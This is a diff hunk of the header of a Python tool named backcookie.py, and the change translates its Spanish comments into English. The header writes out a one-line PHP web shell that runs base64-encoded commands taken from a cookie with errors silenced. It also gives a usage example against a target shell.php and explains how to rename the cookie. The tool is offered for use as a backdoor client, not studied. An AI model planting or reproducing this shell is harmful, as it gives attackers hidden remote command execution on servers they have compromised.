@@ -13,16 +13,16 @@ from urllib2 import build_opener, HTTPHandler #
 ############################################################################
 #                                                                          #
 # Code: <?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?> #
-# Va con un rango de 1 a 0, pero al igual puedes especificar parametros.   #
+# It goes with a range from 1 to 0, but you can customize the parameter.   #
 # Example: python backcookie.py http://target.com/shell.php                #
 #                                                                          #
-# Puedes cambiar el nombre de la cookie, en la linea 46.                   #
-# el valor 1 por el nombre de tu cookie, tambien en php.                   #
-# Example: system(base64_decode($_COOKIE["yourcookie"]));                  ###
-# para que la conexion sea exitosa.                                          #
-#                                                                            #
-# Backcookie es como la gente que encuentra el amor de su vida cada 2 meses. #
-##############################################################################
+# You can change the name of the cookie, in line 46.                       #
+# a value of 1 for the name of your cookie, also in php.                   #
+# Example: system(base64_decode($_COOKIE["yourcookie"]));                  #####
+# so that the connection is successful.                                        #
+#                                                                              #
+# Backcookie is like the people who finds the love of his life every 2 months. #
+################################################################################
 #
 #BackCookie
 #
